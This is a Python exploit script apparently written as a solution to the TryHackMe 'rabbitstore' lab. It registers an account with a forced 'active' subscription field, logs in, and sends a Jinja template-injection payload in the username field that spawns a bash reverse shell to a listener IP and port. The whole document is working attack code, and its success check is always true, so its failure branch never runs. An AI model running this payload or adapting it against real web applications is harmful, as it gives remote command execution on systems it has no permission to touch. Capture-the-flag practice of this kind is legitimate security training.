import requests
import time

# https://tryhackme.com/room/rabbitstore

lhost="10.10.10.10" # listen IP
lport = 9001 # listen port
url = 'http://storage.cloudsite.thm/'

# SSTI 
shell = {
    "username": f"{{{{ self.__init__.__globals__.__builtins__.__import__('os').system('bash -c \"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\"') }}}}"
}

# Register or login
payload = {"email": "admin@admin.thm", "password": "password", "subscription": "active"}
r = requests.post(f"{url}api/register", json=payload, allow_redirects=True)

if '"User already exists"' or '"User registered successfully"' in r.text:
    print("User Available, logging in...")
    time.sleep(1)
    r = requests.post(f"{url}api/login", json=payload, allow_redirects=True)
    storage = r.cookies

    # Inject the SSTI payload
    print("Shell Initiating...\n")
    time.sleep(1)
    r = requests.post(f"{url}api/fetch_messeges_from_chatbot", cookies=storage, json=shell)
    print("========================\n\nCheck your Listener...\n\n========================\n")
else:
    print("failed to start. Check /etc/hosts has storage.cloudsite.thm and cloudsite.thm and the lab hasn't exited")
    print(r.url)
    print(r.text)
